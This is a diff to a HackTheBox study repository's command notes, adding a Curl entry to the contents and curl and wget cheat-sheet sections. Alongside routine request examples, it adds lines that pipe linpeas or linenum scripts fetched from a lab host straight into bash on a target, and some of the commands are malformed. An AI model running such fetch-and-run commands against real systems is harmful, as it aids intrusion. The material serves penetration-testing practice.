@@ -3,6 +3,7 @@
 - [ls](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#ls)
 - [Grep](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#grep)
 - [AWK](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#awk)
+- [Curl](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#curl)
 - [Compression and decompression of files](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#compressing-and-decompressing)
 - [Find](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#find)
 - [xclip](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#xclip)
@@ -57,6 +58,35 @@ awk 'NR==x {print $1}'
 # print lines form a specific line to the end of the file
 awk 'NR>x' users.txt
 
+```
+
+#### Curl
+```bash
+# make http, http2, http3 requests with curl
+curl -vv http://10.10.10.10
+curl --http2 http://10.10.10.10
+curl --http3 http://10.10.10.10
+
+# obtain only the response header
+curl --head http://10.10.10.10.
+
+# upload files via curl
+curl --user "{user}:{creds}" --upload-file=<file> "http://10.10.10.10/upload_location"
+
+# curl save the output
+curl http://10.10.10.10 -o index.html
+
+# pipe the requesting files
+curl http://10.10.10.10:<port_no>:lin(peas\|enum).sh | bash
+```
+
+#### Wget
+```bash
+# download files with wget
+wget http://10.10.10.10/xxx.sh
+
+# run files without downloading
+wget -O - http://10.10.10.11:<port_no>:lin(peas\|enum).sh
 ```
 
 #### SED
